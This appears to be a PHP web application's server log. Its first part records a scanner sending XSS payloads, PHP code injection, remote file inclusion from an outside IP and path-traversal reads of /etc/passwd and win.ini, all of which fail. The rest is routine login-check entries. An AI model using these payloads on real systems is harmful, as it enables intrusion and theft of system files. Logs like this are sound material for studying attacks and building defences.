[ 2016-05-12T02:48:50+08:00 ] 121.42.0.87 /index.php/'%22/%3E%3C/script%3E%3Cscript%3Ealert()%3C/script%3E/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:'"

[ 2016-05-12T02:49:02+08:00 ] 121.42.0.87 /index.php/%2527%2522%252f%253E%253C%252fscript%253E%253Cscript%253Ealert%2528%2529%253C%252fscript%253E/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:%27%22%2f%3E%3C%2fscript%3E%3Cscript%3Ealert%28%29%3C%2fscript%3E

[ 2016-05-12T02:49:25+08:00 ] 121.42.0.87 /index.php/'%22+onmouseover=alert()+d='%22/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:'"+onmouseover=alert()+d='"

[ 2016-05-12T02:49:34+08:00 ] 121.42.0.87 /index.php/%27%22%20onmouseover%3Dalert%28%29%20d%3D%27%22/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:'" onmouseover=alert() d='"

[ 2016-05-12T02:49:47+08:00 ] 121.42.0.87 /index.php/%2527%2522%2520onmouseover%253Dalert%2528%2529%2520d%253D%2527%2522/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:%27%22%20onmouseover%3Dalert%28%29%20d%3D%27%22

[ 2016-05-12T02:50:50+08:00 ] 121.42.0.87 /index.php/'%22+style=x:expression(alert())+d='%22/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:'"+style=x:expression(alert())+d='"

[ 2016-05-12T02:50:59+08:00 ] 121.42.0.87 /index.php/%27%22%20style%3dx%3Aexpression%28alert%28%29%29%20d%3D%27%22/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:'" style=x:expression(alert()) d='"

[ 2016-05-12T02:51:03+08:00 ] 121.42.0.87 /index.php/%2527%2522%2520style%253dx%253Aexpression%2528alert%2528%2529%2529%2520d%253D%2527%2522/?g=user&m=favorite&a=do_dsfav&id=5
ERR: 无法加载控制器:%27%22%20style%3dx%3Aexpression%28alert%28%29%29%20d%3D%27%22

[ 2016-05-12T02:51:21+08:00 ] 121.42.0.87 /index.php?g=user&m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&a=do_dsfav&id=5
ERR: 无法加载控制器:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

[ 2016-05-12T02:51:34+08:00 ] 121.42.0.87 /index.php?g=user&m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&a=do_dsfav&id=5
ERR: 无法加载控制器:AmF2YXNjcmlwdDpwcm9tcHQoMTExKTt4

[ 2016-05-12T02:51:51+08:00 ] 121.42.0.87 /index.php?g=user&m=favoritei1231444i&a=do_dsfav&id=5
ERR: 无法加载控制器:Favoritei1231444i

[ 2016-05-12T03:05:18+08:00 ] 121.42.0.67 /index.php?g=user&m=favorite'%22%3E%3Ciframe%20onload=alert()%3E&a=do_dsfav&id=5
ERR: 无法加载控制器:Favorite'">

[ 2016-05-12T03:05:29+08:00 ] 121.42.0.57 /index.php?g=user&m=favorite'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&a=do_dsfav&id=5
ERR: 无法加载控制器:Favorite'">

[ 2016-05-12T03:06:08+08:00 ] 121.42.0.60 /index.php?g=user&m=favorite'%22%3E%3Csvg%20onload=prompt()%3E&a=do_dsfav&id=5
ERR: 无法加载控制器:Favorite'">

[ 2016-05-12T03:06:32+08:00 ] 121.42.0.87 /index.php?g=user&m=http://120.26.55.211/s.txt&a=do_dsfav&id=5
ERR: 无法加载控制器:Http://120.26.55.211/s.txt

[ 2016-05-12T03:06:45+08:00 ] 121.42.0.87 /index.php?g=user&m=http%3A%2F%2F120.26.55.211%2Fs.txt&a=do_dsfav&id=5
ERR: 无法加载控制器:Http://120.26.55.211/s.txt

[ 2016-05-12T03:07:40+08:00 ] 121.42.0.87 /index.php?g=user&m=a_long_name_file_not_exist&a=do_dsfav&id=5
ERR: 无法加载控制器:A_long_name_file_not_exist

[ 2016-05-12T03:08:01+08:00 ] 121.42.0.87 /index.php?g=user&m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&a=do_dsfav&id=5
ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}

[ 2016-05-12T03:09:00+08:00 ] 121.42.0.87 /index.php?g=user&m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&a=do_dsfav&id=5
ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}\

[ 2016-05-12T03:12:08+08:00 ] 121.42.0.87 /index.php?g=user&m=%2Fetc%2Fpasswd&a=do_dsfav&id=5
ERR: 无法加载控制器:/etc/passwd

[ 2016-05-12T03:13:11+08:00 ] 121.42.0.87 /index.php?g=user&m=c%3A%2F%2Fwindows%2Fwin.ini&a=do_dsfav&id=5
ERR: 无法加载控制器:C://windows/win.ini

[ 2016-05-12T03:13:24+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../etc/passwd

[ 2016-05-12T03:13:33+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../windows/win.ini

[ 2016-05-12T03:14:12+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../../../windows/win.ini00

[ 2016-05-12T03:14:25+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../etc/passwd.jpg

[ 2016-05-12T03:14:47+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../windows/win.ini.jpg

[ 2016-05-12T03:14:54+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../etc/passwd
.jpg

[ 2016-05-12T03:15:31+08:00 ] 121.42.0.87 /index.php?g=user&m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&a=do_dsfav&id=5
ERR: 无法加载控制器:../../../../../../../../windows/win.ini
.jpg

[ 2016-05-12T09:22:34+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T09:30:50+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T09:31:01+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T09:31:56+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T09:39:43+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T09:40:45+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001954s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003907s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T09:41:20+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:41:26+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:42:23+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:47:16+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:47:20+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:47:22+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:47:33+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:47:49+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:47:51+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:48:14+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:48:18+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001954s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.004883s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:49:30+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:50:14+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:50:32+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:50:43+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:55:10+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:56:10+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:56:15+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:58:02+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T14:59:56+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:05:52+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001954s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003907s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:06:01+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:06:28+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:06:50+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:10:35+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:13:02+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003907s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:13:18+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001953s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:14:40+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:14:58+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:15:11+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:15:21+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:21:12+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001953s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.004883s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:21:14+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:21:41+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:57:12+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:57:19+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:57:22+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:58:44+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:58:56+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003907s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T15:59:44+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:00:11+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:00:24+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:00:26+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:02:32+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001953s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.002930s ]
INFO: [ app_begin ] --END-- [ RunTime:0.005859s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:02:39+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:05:00+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
